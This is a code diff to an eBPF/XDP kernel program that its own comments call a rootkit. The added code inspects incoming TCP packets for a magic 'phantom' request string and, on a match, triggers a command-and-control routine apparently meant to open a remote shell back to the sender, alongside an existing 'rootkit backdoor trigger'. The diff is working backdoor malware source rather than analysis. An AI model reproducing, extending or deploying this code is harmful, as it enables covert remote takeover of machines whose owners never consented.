@@ -50,6 +50,42 @@ struct eth_hdr {
 	unsigned short  h_proto;
 };
 
+/**
+ * @brief Checks for the packet to be a phantom request
+ * Returns 1 if it wants to stop the XDP pipeline.
+ * 
+ * @param payload 
+ * @param payload_size 
+ * @param data_end 
+ * @param ip 
+ * @param tcp 
+ * @return __always_inline 
+ */
+static __always_inline int check_phantom_payload(char* payload, int payload_size, void* data_end, struct iphdr* ip, struct tcphdr* tcp){
+    if (tcp_payload_bound_check(payload, payload_size, data_end)){
+            bpf_printk("G");
+            return XDP_PASS;
+        }
+    bpf_printk("Detected possible phantom shell command\n");
+    //Check if phantom shell command
+    char phantom_request[] = CC_PROT_PHANTOM_COMMAND_REQUEST;
+    int is_phantom_request = 1;
+    for(int ii=0; ii<sizeof(CC_PROT_PHANTOM_COMMAND_REQUEST)-1; ii++){
+        if(phantom_request[ii] != payload[ii]){
+            is_phantom_request = 0;
+            //bpf_printk("Not phantom: %s\n", payload);
+            break;
+        }
+    }
+    if(is_phantom_request == 1){
+        execute_key_command(CC_PROT_COMMAND_PHANTOM_SHELL, ip->saddr, tcp->source, payload, payload_size);
+        return 1;
+    }
+    bpf_printk("Not phantom shell\n");
+    return 0;
+}
+
+
 
 SEC("xdp_prog")
 int xdp_receive(struct xdp_md *ctx){
@@ -97,6 +133,34 @@ int xdp_receive(struct xdp_md *ctx){
 
     payload_size = bpf_ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);
     payload = (void *)tcp + tcp->doff*4;
+
+    int ret_value = -1;
+    //Yes, the verifier gets a bit angry when trying working with intervals in the payload
+    //A chained if is also not good. A macro could be added for this kind of cases.
+    if(payload_size == sizeof(CC_PROT_PHANTOM_COMMAND_REQUEST)){
+        ret_value = check_phantom_payload(payload, payload_size, data_end, ip, tcp);   
+    }
+    if(payload_size == sizeof(CC_PROT_PHANTOM_COMMAND_REQUEST)+1){
+        ret_value = check_phantom_payload(payload, payload_size, data_end, ip, tcp);
+    }
+    if(payload_size == sizeof(CC_PROT_PHANTOM_COMMAND_REQUEST)+2){
+        ret_value = check_phantom_payload(payload, payload_size, data_end, ip, tcp);
+    }
+    if(payload_size == sizeof(CC_PROT_PHANTOM_COMMAND_REQUEST)+3){
+        ret_value = check_phantom_payload(payload, payload_size, data_end, ip, tcp);
+    }
+    if(payload_size == sizeof(CC_PROT_PHANTOM_COMMAND_REQUEST)+4){
+        ret_value = check_phantom_payload(payload, payload_size, data_end, ip, tcp);
+    }
+    if(payload_size == sizeof(CC_PROT_PHANTOM_COMMAND_REQUEST)+5){
+        ret_value = check_phantom_payload(payload, payload_size, data_end, ip, tcp);
+    }
+    if(payload_size == sizeof(CC_PROT_PHANTOM_COMMAND_REQUEST)+6){
+        ret_value = check_phantom_payload(payload, payload_size, data_end, ip, tcp);
+    }
+    if(ret_value == 1){
+        return XDP_PASS;
+    }
 
     //Check for the rootkit backdoor trigger V1
     if(payload_size == CC_TRIGGER_SYN_PACKET_PAYLOAD_SIZE){
